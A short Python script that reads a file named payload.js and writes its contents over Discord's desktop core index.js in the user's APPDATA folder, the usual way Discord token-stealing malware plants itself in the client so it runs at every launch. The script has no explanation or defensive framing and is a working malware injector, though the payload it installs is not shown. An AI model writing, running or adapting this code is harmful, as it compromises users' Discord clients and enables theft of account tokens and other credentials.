import glob
import os
payload_file = open("payload.js","r")
payload_content = payload_file.read()
file = open(glob.glob(os.getenv('APPDATA')+'/discord/*/modules/discord_desktop_core/index.js')[0],'w')
file.write(payload_content)
file.close()
